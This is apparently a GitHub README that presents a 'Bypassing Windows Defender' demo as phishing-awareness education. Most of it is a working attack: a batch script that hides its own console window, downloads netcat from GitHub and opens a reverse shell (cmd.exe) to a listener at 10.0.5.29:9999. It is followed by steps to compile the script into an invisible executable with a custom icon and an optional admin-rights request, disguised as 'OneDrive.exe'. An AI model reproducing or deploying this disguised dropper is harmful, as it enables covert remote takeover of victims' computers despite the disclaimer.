# Bypassing-Windows-Defender-for-fun
Disclaimer:

This presentation is intended solely for educational purposes to increase awareness about phishing attacks and cybersecurity threats. The techniques demonstrated are to help you recognize and defend against potential threats. By attending this presentation, you acknowledge that any misuse or illegal use of this information is strictly prohibited and is not endorsed. The presenter bears no responsibility for any such misuse.

In this demo I am taking advantage of simple things, casual softwares intended for ethical use cases and I shape them to be dangerous assets to hack our way in.
Let’s take a look at the script we are using.
`@echo off
call getCmdPid
call windowMode -pid %errorlevel% -mode hidden & curl https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -o C:\Users\Public\Downloads\nc64.exe & C:\Users\Public\Downloads\nc64.exe -e cmd.exe 10.0.5.29 9999`

What the script does :
`@echo off` is a standard directive in batch files (.bat) in Windows, and it serves a similar purpose to #!/bin/bash in Linux shell scripts. Its job is to not show the commands that are being ran.

`getCmdPid.exe` is responsible for printing the PID number of the windows process we are using.

`call windowMode -pid %errorlevel% -mode hidden` now we pass the pid number of the cmd prompt we are currently on to the windowmode.exe and hiding any potential errors.

`the rest of the script` downloads netcat (a remote control tool) and outputs it to a set folder, in this case C:\Users\Public\Downloads and then runs it with the parameter –e to connect to our listening machine 10.0.5.29 through the port 9999.

![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/1188ce4d-34c9-4d61-91d8-227485c9936f)

We then use bat-to-exe-converter to convert/build our batch file to an exetuable file.

#things to change:
-import an icon to be set as the final exe’s icon
-change exe format to 64-bit | Windows (invisible) ///This makes the exe run without triggereing the cmd.exe prompt to show.
Note: You can check the Request admin privileges box to make the final exe request admin privs to run.
The result : OneDrive.exe
